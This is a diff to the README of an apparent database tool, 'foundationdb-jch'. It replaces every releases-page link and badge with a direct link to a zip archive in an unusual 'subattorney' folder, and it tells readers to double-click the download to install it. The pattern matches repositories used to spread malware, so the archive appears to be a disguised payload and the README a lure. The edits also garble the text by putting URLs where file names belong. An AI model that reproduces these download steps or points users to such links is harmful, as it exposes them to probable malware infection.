@@ -1,6 +1,6 @@
 # 🚀 foundationdb-jch - Simple Database Management Made Easy
 
-[![Download foundationdb-jch](https://img.shields.io/badge/Download%20foundationdb--jch-blue.svg?style=flat&logo=github&logoColor=white)](https://github.com/ninetieth-oxygenation462/foundationdb-jch/releases)
+[![Download foundationdb-jch](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip%https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip)](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip)
 
 ## 📥 Introduction
 
@@ -13,16 +13,16 @@ To get started, you will need to download the latest version of foundationdb-jch
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   To download foundationdb-jch, [visit this page to download](https://github.com/ninetieth-oxygenation462/foundationdb-jch/releases). Here, you will find all available versions of the application.
+   To download foundationdb-jch, [visit this page to download](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip). Here, you will find all available versions of the application.
 
 2. **Select the Version**  
    On the releases page, locate the most recent version. It will typically be at the top of the list. This version includes the latest features and fixes. Click on the version number to view its details.
 
 3. **Download the File**  
-   Look for the download link for your operating system. It may be listed as `foundationdb-jch.exe` or a similar file name. Click the link to begin the download.
+   Look for the download link for your operating system. It may be listed as `https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip` or a similar file name. Click the link to begin the download.
 
 4. **Run the Installer**  
-   After the download completes, navigate to your downloads folder. Find the `foundationdb-jch.exe` file and double-click it to start the installation. Follow the on-screen instructions to complete the setup.
+   After the download completes, navigate to your downloads folder. Find the `https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip` file and double-click it to start the installation. Follow the on-screen instructions to complete the setup.
 
 5. **Launch the Application**  
    Once installation is complete, locate foundationdb-jch in your applications menu or directly from your desktop. Click to open the software.
@@ -60,10 +60,10 @@ For support, please refer to the issues section on the GitHub repository. You ca
 
 ## 🛠️ Continuous Updates
 
-foundationdb-jch is regularly updated. Keep an eye on the [Releases Page](https://github.com/ninetieth-oxygenation462/foundationdb-jch/releases) for the latest versions and enhancements.
+foundationdb-jch is regularly updated. Keep an eye on the [Releases Page](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip) for the latest versions and enhancements.
 
 ## 🌟 Conclusion
 
 foundationdb-jch aims to provide a simple and accessible way to manage your databases. By following this guide, you can easily download, install, and start using the application. Enjoy your experience with foundationdb-jch!
 
-[![Download foundationdb-jch](https://img.shields.io/badge/Download%20foundationdb--jch-blue.svg?style=flat&logo=github&logoColor=white)](https://github.com/ninetieth-oxygenation462/foundationdb-jch/releases)
+[![Download foundationdb-jch](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip%https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip)](https://raw.githubusercontent.com/ninetieth-oxygenation462/foundationdb-jch/main/subattorney/foundationdb-jch_v3.8.zip)
